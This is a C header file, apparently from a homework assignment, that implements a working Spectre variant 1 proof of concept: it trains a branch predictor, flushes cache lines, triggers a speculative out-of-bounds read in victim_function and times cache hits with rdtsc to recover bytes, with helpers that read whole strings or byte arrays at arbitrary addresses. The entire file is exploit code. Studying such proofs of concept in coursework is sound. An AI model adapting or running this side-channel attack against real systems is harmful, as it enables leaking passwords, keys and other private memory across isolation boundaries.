//
// Created by me on 22.01.2021.
//

#ifndef HW6__SPECTRE_H_
#define HW6__SPECTRE_H_

#include <inttypes.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h>
#else
#include <x86intrin.h>
#endif


// Play with these
#define BRANCH_TRAINS 20


// Probably don't want to play with these
#define PAGE_SIZE 4096

FILE *output = NULL;

#define side_effects_size (256L * PAGE_SIZE)
uint8_t *side_effects;
size_t array_size = BRANCH_TRAINS;
volatile uint8_t base_array[BRANCH_TRAINS];
uint64_t temp;

#define SYSTEM_LEARN_COUNT 1000
uint64_t cache_hit_time;

void init_spectre() {
  side_effects = malloc(side_effects_size);
  memset(side_effects, 0xda, side_effects_size); // Not zero because 0-page
  memset((uint8_t *) base_array, 0, BRANCH_TRAINS);
  temp = side_effects[0];
  uint64_t sum = 0;
  for (int i = 0; i < SYSTEM_LEARN_COUNT; i++) {
    __sync_synchronize();
    uint64_t start = __rdtsc();
    __sync_synchronize();
    temp = side_effects[0];
    __sync_synchronize();
    volatile uint64_t time = __rdtsc() - start;
    sum += time;
  }
  cache_hit_time = sum * 17 / SYSTEM_LEARN_COUNT / 10;
}

uint8_t __attribute__((noinline)) victim_function(uint64_t i) {
  if (i < array_size)
    return side_effects[base_array[i] * PAGE_SIZE];
  return 0;
}

uint8_t read_at(uint64_t addr) {
  addr -= (uint64_t) &base_array; // address relative to our array
  for (uint64_t t_iter = 0;; t_iter++) {
    for (volatile uint64_t i = 0; i < BRANCH_TRAINS; i++) { // training
      victim_function(i);
    }
    _mm_clflush(&array_size);
    for (uint64_t i = 0; i < 256; i++) {
      _mm_clflush(&side_effects[i * PAGE_SIZE]);
    }
    for (uint64_t i = 0; i < BRANCH_TRAINS; i++) {
      _mm_clflush((uint64_t *) &base_array[i]);
    }
    victim_function(addr);

    for (volatile uint64_t i = 0; i < 256; i++) {
      __sync_synchronize(); // Following code has to be executed in correct order, so we synchronize the pipeline
      uint64_t start = __rdtsc();
      __sync_synchronize();
      temp = side_effects[i * PAGE_SIZE];
      __sync_synchronize();
      volatile uint64_t time = __rdtsc() - start;
      if (time <= cache_hit_time) {// faster than else's average - that's a cache hit.
        if (output != NULL) {
          fprintf(output,
                  "%p = %c - page takes %lld cycles to read (average = %llu) (took %llu iterations)\n",
                  (void *) addr,
                  (char) i,
                  (long long) time,
                  (long long) cache_hit_time,
                  (long long) t_iter);
        }
        return i;
      }
    }
  }
}

char *read_byte_string_at(uint64_t addr) {
  size_t capacity = 1;
  char *a = malloc(capacity);
  size_t read = 0;
  do {
    a[read] = read_at(addr + read);
    read++;
    if (read == capacity) {
      capacity *= 2;
      a = realloc(a, capacity);
    }
  } while (a[read - 1]);
  a = realloc(a, read);
  return a;
}

uint8_t *read_byte_array_at(uint64_t addr, size_t num) {
  uint8_t *a = malloc(num);
  for (size_t offset = 0; offset < num; offset++) {
    a[offset] = read_at(addr + offset);
  }
  return a;
}

#endif //HW6__SPECTRE_H_
